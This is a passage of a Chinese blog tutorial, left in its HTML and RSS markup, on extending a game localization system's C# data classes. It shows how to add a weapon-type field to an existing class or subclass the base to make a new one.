<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationStringData</span> : <span class="hljs-type">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> string content;
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationImageData</span> : <span class="hljs-type">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> Sprite content;
}
</code></pre>
<ul>
<li>在本地化系统的内部实现中，GetContent的泛型参数T指定了本地化保存的数据类型，内置了LocalizationStringData和LocalIzationImageData两种数据类型，分别持有string成员和Sprite成员，对应文本和图片数据。</li>
<li>有两种修改思路，一种是在已有的两个个数据类型添加额外的数据成员,比如一个武器在UI上的显示除了有描述内容还有武器的类型string。</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationStringData</span> : <span class="hljs-title class_">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> content;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-keyword">type</span>;
}
</code></pre>
<ul>
<li>另外一种是直接继承抽象类LocalizationDataBase写一个新类，比如还是武器类型和武器描述的UI本地化数据,其实两种方式本质也没啥区别，只是说明数据类数量和类内的数据成员都可以扩展满足开发者想要的需求。</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationWeaponData</span> : <span class="hljs-title class_">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> content;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-keyword">type</span>;
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>